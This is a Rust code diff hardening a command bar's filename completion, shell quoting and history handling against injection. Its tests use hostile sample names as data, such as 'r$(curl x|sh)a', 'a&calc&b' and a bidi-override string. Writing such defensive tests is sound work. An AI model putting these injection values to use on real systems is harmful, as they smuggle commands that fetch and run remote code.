@@ -29,7 +29,13 @@ impl CommandBar {
     /// An empty line over `history` (oldest first), capped at
     /// [`HISTORY_MAX`].
     #[must_use]
-    pub fn new(mut history: Vec<String>) -> Self {
+    pub fn new(history: Vec<String>) -> Self {
+        // A history file is text anyone can edit: filtered like typing.
+        let mut history: Vec<String> = history
+            .into_iter()
+            .map(|h| h.chars().filter(|c| allowed(*c)).collect::<String>())
+            .filter(|h| !h.trim().is_empty())
+            .collect();
         let excess = history.len().saturating_sub(HISTORY_MAX);
         history.drain(..excess);
         Self {
@@ -75,7 +81,7 @@ impl CommandBar {
     /// Types `s` at the cursor. Control characters are dropped: the line is
     /// one order, and a newline in it would be two.
     pub fn insert(&mut self, s: &str) {
-        let clean: String = s.chars().filter(|c| !c.is_control()).collect();
+        let clean: String = s.chars().filter(|c| allowed(*c)).collect();
         let at = self.byte_at(self.cursor);
         self.buffer.insert_str(at, &clean);
         self.cursor += clean.chars().count();
@@ -172,16 +178,15 @@ impl CommandBar {
                             .count(),
                     );
                 }
-                // Only what is plain, printable text: a prefix ending inside
-                // a multibyte char or holding a control byte waits for the
-                // reader to type one more letter.
-                let Ok(p) = std::str::from_utf8(&many[0][..prefix]) else {
-                    return false;
-                };
-                if p.chars().any(char::is_control) || p.len() <= word.len() {
+                // Only a prefix of PLAIN bytes, which every shell reads
+                // literally: anything else (a space, `$(`, a quote) would go
+                // into the line live, and quoting half a word cannot be left
+                // open safely. The reader types one more letter instead.
+                let p = &many[0][..prefix];
+                if p.len() <= word.len() || !p.iter().all(|b| plain(*b)) {
                     return false;
                 }
-                p.to_owned()
+                String::from_utf8_lossy(p).into_owned()
             }
         };
         let tail = self.buffer[at..].to_owned();
@@ -191,16 +196,47 @@ impl CommandBar {
         true
     }
 
-    /// The order to run, trimmed, recorded in the history; `None` when the
-    /// line is blank. The line empties either way.
+    /// [`Self::complete`] for the shell at `shell`: one norte cannot quote
+    /// for (cmd, PowerShell…) only completes names made of characters no
+    /// shell gives meaning to.
+    pub fn complete_for(&mut self, names: &[&[u8]], shell: &Path) -> bool {
+        if let Some(kind) = shell_quoting(shell) {
+            return self.complete(names, kind);
+        }
+        let safe: Vec<&[u8]> = names
+            .iter()
+            .copied()
+            .filter(|n| n.iter().all(|b| inert_everywhere(*b)))
+            .collect();
+        self.complete(&safe, None)
+    }
+
+    /// Inserts `name` quoted for the shell at `shell`. `false` (nothing
+    /// inserted) for a shell norte cannot quote for and a name that would
+    /// mean something to it.
+    pub fn insert_name(&mut self, shell: &Path, name: &[u8]) -> bool {
+        match shell_quoting(shell) {
+            Some(kind) => self.insert(&quote_for(kind, name)),
+            None if name.iter().all(|b| inert_everywhere(*b)) => {
+                self.insert(&String::from_utf8_lossy(name));
+            }
+            None => return false,
+        }
+        true
+    }
+
+    /// The order to run, trimmed, recorded in the history unless it was
+    /// typed with a leading space (`HISTCONTROL=ignorespace`); `None` when
+    /// the line is blank. The line empties either way.
     pub fn take(&mut self) -> Option<String> {
+        let private = self.buffer.starts_with(' ');
         let order = self.buffer.trim().to_owned();
         self.set(String::new());
         self.browsing = None;
         if order.is_empty() {
             return None;
         }
-        if self.history.last() != Some(&order) {
+        if !private && self.history.last() != Some(&order) {
             self.history.push(order.clone());
             let excess = self.history.len().saturating_sub(HISTORY_MAX);
             self.history.drain(..excess);
@@ -209,9 +245,35 @@ impl CommandBar {
     }
 }
 
-/// Bytes every shell reads literally, unquoted.
+/// How names are quoted for `shell`: `Some(Some(_))` bash/zsh/fish,
+/// `Some(None)` a POSIX sh, `None` a shell norte cannot quote for.
+#[must_use]
+pub fn shell_quoting(shell: &Path) -> Option<Option<Shell>> {
+    let name = shell.file_name()?.to_string_lossy().to_ascii_lowercase();
+    let name = name.strip_suffix(".exe").unwrap_or(&name);
+    match name {
+        "sh" | "dash" | "ash" | "ksh" | "mksh" | "busybox" => Some(None),
+        other => Shell::parse(other).map(Some),
+    }
+}
+
+/// Bytes every shell reads literally, unquoted (not `%`: fish expands
+/// `%self` in some versions).
 fn plain(b: u8) -> bool {
-    b.is_ascii_alphanumeric() || b"._,/:=+@%-".contains(&b)
+    b.is_ascii_alphanumeric() || b"._,/:=+@-".contains(&b)
+}
+
+/// Bytes no shell gives meaning to, cmd.exe included (which splits on `,`,
+/// `;` and `=`).
+fn inert_everywhere(b: u8) -> bool {
+    b.is_ascii_alphanumeric() || b"._-/:".contains(&b)
+}
+
+/// What may enter the line: no control character (one order, one line) and
+/// no bidi override or zero-width character, so what is painted is what
+/// runs.
+fn allowed(c: char) -> bool {
+    !c.is_control() && !norte_encoding::is_terminal_hazard(c)
 }
 
 /// `name` as ONE word for `shell` (`None` = POSIX `sh`), and ASCII only,
@@ -227,7 +289,10 @@ pub fn quote_for(shell: Option<Shell>, name: &[u8]) -> String {
         Some(Shell::Bash | Shell::Zsh) => {
             out.push_str("$'");
             for &b in name {
-                if (0x20..0x7f).contains(&b) && b != b'\'' && b != b'\\' {
+                // Every byte that is not plain is escaped, `$`, `` ` `` and
+                // `"` included: inside double quotes the reader opened,
+                // `$'` is not special, and the word must stay inert there.
+                if plain(b) {
                     out.push(char::from(b));
                 } else {
                     let _ = write!(out, "\\{b:03o}");
@@ -398,5 +463,100 @@ mod tests {
         let mut b = CommandBar::new(Vec::new());
         b.insert("ls\nrm -rf x");
         assert_eq!(b.text(), "lsrm -rf x");
+    }
+
+    /// A shared prefix that is not plain text is NOT inserted raw: names
+    /// `r$(x)a` and `r$(x)b` must not put `r$(x)` in the line.
+    #[test]
+    fn a_hostile_shared_prefix_is_not_inserted() {
+        let mut b = CommandBar::new(Vec::new());
+        b.insert("cat r");
+        assert!(!b.complete(&[b"r$(curl x|sh)a", b"r$(curl x|sh)b"], Some(Shell::Bash)));
+        assert_eq!(b.text(), "cat r");
+        let names = norte_testkit::corpus::hostile_names();
+        let pairs: Vec<Vec<u8>> = names
+            .iter()
+            .flat_map(|n| {
+                let mut a = n.bytes.clone();
+                a.push(b'1');
+                let mut z = n.bytes.clone();
+                z.push(b'2');
+                [a, z]
+            })
+            .collect();
+        for pair in pairs.chunks(2) {
+            let mut b = CommandBar::new(Vec::new());
+            b.insert("x ");
+            let refs: Vec<&[u8]> = pair.iter().map(Vec::as_slice).collect();
+            b.complete(&refs, Some(Shell::Bash));
+            assert!(
+                b.text().bytes().all(|c| plain(c) || c == b' '),
+                "{:?}",
+                b.text()
+            );
+        }
+    }
+
+    /// Bidi overrides and zero-width characters never reach the line: what
+    /// is painted is what runs.
+    #[test]
+    fn terminal_hazards_never_reach_the_line() {
+        let mut b = CommandBar::new(vec!["ok\u{202E}evil".into()]);
+        b.insert("a\u{202E}b\u{200B}c");
+        assert_eq!(b.text(), "abc");
+        b.history_prev();
+        assert_eq!(b.text(), "okevil");
+    }
+
+    /// `HISTCONTROL=ignorespace`: an order typed with a leading space runs
+    /// but is not remembered.
+    #[test]
+    fn a_leading_space_keeps_an_order_out_of_the_history() {
+        let mut b = CommandBar::new(Vec::new());
+        b.insert(" mysql -psecret");
+        assert_eq!(b.take().as_deref(), Some("mysql -psecret"));
+        assert!(b.history().is_empty());
+    }
+
+    /// Inside double quotes the reader opened, a bash word is still inert:
+    /// every byte that is not plain is an octal escape.
+    #[test]
+    fn a_bash_word_has_no_live_character_even_inside_double_quotes() {
+        let q = quote_for(Some(Shell::Bash), b"a`id`$(id)\"b");
+        assert!(!q[2..q.len() - 1].contains(['`', '$', '"']), "{q}");
+    }
+
+    /// For cmd.exe, a name with a separator or a special character is not
+    /// inserted at all; a plain one is, as is.
+    #[test]
+    fn cmd_gets_only_names_that_mean_nothing_to_it() {
+        let cmd = std::path::Path::new("C:\\Windows\\System32\\cmd.exe");
+        let mut b = CommandBar::new(Vec::new());
+        assert!(!b.insert_name(cmd, b"a&calc&b"));
+        assert!(!b.insert_name(cmd, b"a b.txt"));
+        assert_eq!(b.text(), "");
+        assert!(b.insert_name(cmd, b"report-1.txt"));
+        assert_eq!(b.text(), "report-1.txt");
+    }
+
+    /// The shells norte knows how to quote for; cmd and PowerShell are not.
+    #[test]
+    fn only_known_shells_get_names_quoted() {
+        use std::path::Path;
+        assert_eq!(
+            shell_quoting(Path::new("/bin/bash")),
+            Some(Some(Shell::Bash))
+        );
+        assert_eq!(
+            shell_quoting(Path::new("/usr/bin/fish")),
+            Some(Some(Shell::Fish))
+        );
+        assert_eq!(shell_quoting(Path::new("/bin/dash")), Some(None));
+        assert_eq!(
+            shell_quoting(Path::new("C:\\Windows\\System32\\cmd.exe")),
+            None
+        );
+        assert_eq!(shell_quoting(Path::new("/usr/bin/pwsh")), None);
+        assert_eq!(shell_quoting(Path::new("/usr/bin/nu")), None);
     }
 }
